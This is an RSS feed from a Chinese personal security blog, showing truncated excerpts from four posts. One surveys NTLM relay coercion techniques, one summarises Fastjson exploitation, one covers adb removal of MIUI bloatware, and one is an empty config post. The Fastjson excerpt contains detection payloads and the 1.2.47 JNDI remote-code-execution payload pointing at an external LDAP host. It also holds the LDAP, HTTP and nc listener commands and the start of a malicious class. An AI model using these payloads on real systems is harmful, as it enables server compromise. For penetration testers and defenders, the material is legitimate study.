<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>所有文章 - 柠檬k</title>
        <link>https://songzhiv.github.io/posts/</link>
        <description>所有文章 | 柠檬k</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>songzhiv@126.com (nmk)</managingEditor>
            <webMaster>songzhiv@126.com (nmk)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Fri, 18 Feb 2022 17:10:15 &#43;0800</lastBuildDate><atom:link href="https://songzhiv.github.io/posts/" rel="self" type="application/rss+xml" /><item>
    <title>NTLM Relay</title>
    <link>https://songzhiv.github.io/ntlm-relay/</link>
    <pubDate>Fri, 18 Feb 2022 17:10:15 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://songzhiv.github.io/ntlm-relay/</guid>
    <description><![CDATA[本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：
NTLM 篇 - windows protocol
NTLM Relay - hackndo
本篇主要围绕下图进行。来自
https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
" https://www.thehacker.recipes/ad/movement/ntlm/relay 
触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
 MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
 如果机器开启lsarpc的匿名访问。即可在不知道账户密码的情况下触发强制身份认证。
PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
强制身份验证通过 SMB 进行。
上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
 ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。]]></description>
</item><item>
    <title>Fastjson利用总结</title>
    <link>https://songzhiv.github.io/fastjson/</link>
    <pubDate>Tue, 01 Feb 2022 23:11:59 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://songzhiv.github.io/fastjson/</guid>
    <description><![CDATA[0X01 漏洞利用 探测fastjson 对于有错误回显的情况
使用{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;或者 &quot;{&quot;a&quot;:x&quot;通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了
无回显使用dnslog探测POC：
1 2 3 4 5  1. {&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;}} 2. {&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;} 3. {&#34;@type&#34;:&#34;java.net.Inet6Address&#34;,&#34;val&#34;:&#34;sq20yi.ceye.io&#34;} 4. {&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}}&#34;&#34;} 5. Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://sq20yi.ceye.io&#34;}]   抓包修改请求体
==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据
验证是否存在漏洞 fastjson1.2.47以后的版本利用 条件都比较苛刻，所以我们一般都会采用经典的1.2.47的POC，
无限制RCE，通杀≤1.2.47的所有版本。47版本poc如下
{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.119.161.84:1389/Exploit&quot;,&quot;autoCommit&quot;:true}}}
 在我们的云服务器上开启LDAP服务：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit 同目录开启http服务：python3 -m http.server 80 NC监听：nc -lvvp 8888 javac编译下面恶意类，将编译好的Exploit.class文件放在http同目录下  1 2 3 4 5 6 7 8 9 10 11 12  public class Exploit { public Exploit(){ try{ Runtime.]]></description>
</item><item>
    <title>Adb卸载手机原装软件</title>
    <link>https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/</link>
    <pubDate>Tue, 01 Feb 2022 21:11:59 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/</guid>
    <description><![CDATA[Adb卸载手机原装软件 我的手机系统是miui12.5，其他手机也类似
准备 首先下载google adb工具并解压
 进入开发者模式。miui中进入设置=》我的****设备=》全部参数。连续点击5下miui版本进入开发者模式。 数据线链接电脑。 回到设置中搜索框输入开发者选项，点进去找到USB调试，接受风险打开。 进入adb目录打开cmd或者powershell  输入.\adb.exe shell 显示下面这样就成功链接了
卸载垃圾应用 命令 ==pm uninstall –user 0 com.miui.systemAdSolution== 最后跟的是应用的包名，包名可以在应用管理中查看，想卸载哪个应用就点开那个应用，把最后的包名替换就行了。success就表示成功了。
下面是我卸载的应用
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  pm uninstall --user 0 com.miui.systemAdSolution（小米系统广告解决方案） pm uninstall --user 0 com.miui.analytics（小米广告分析） pm uninstall --user 0 com.miui.personalassistant（智能助理：既不智能，也不助理，除了卡，没别哒） pm uninstall --user 0 com.]]></description>
</item><item>
    <title>个人配置</title>
    <link>https://songzhiv.github.io/config/</link>
    <pubDate>Tue, 01 Feb 2022 21:11:59 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://songzhiv.github.io/config/</guid>
    <description><![CDATA[<p>配置</p>]]></description>
</item></channel>
</rss>
